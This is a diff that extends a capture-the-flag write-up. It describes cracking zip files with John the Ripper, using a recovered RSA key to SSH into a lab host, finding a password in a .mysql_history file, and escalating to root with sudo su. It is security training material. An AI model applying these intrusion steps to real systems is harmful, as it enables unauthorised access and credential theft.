@@ -64,4 +64,26 @@ john --show miriam.txt
 john --show tom.txt
 john --show zlatan.txt
 ```
-From the output of the script, we realize that only ```tom.zip``` could be cracked and the password is ```iuubire```
+From the output of the script, we realize that only ```tom.zip``` could be cracked and the password is ```iuubire```. Unzipping ```tom.zip``` file reveals a PEM RSA private key file that could be used to SSH into a private server.
+```code
+ssh -i id_rsa tom@192.168.54.107
+```
+In the home directory of the server that we manage to SSH into, we discover a ```.mysql_history``` file that contains the password (```xx11yy22!```) to the user
+```code
+_HiStOrY_V2_
+show\040databases;
+quit
+create\040database\040'support';
+create\040database\040support;
+use\040support
+create\040table\040users;
+show\040tables
+;
+select\040*\040from\040support
+;
+show\040tables;
+select\040*\040from\040support;
+insert\040into\040support\040(tom,\040xx11yy22!);
+quit
+```
+With the password, we can execute ```sudo su``` command to obtain root privileges. In the root directory, there are 2 files ```flag.txt``` and ```proof.txt```. Our flag can be found in the ```proof.txt``` file. 
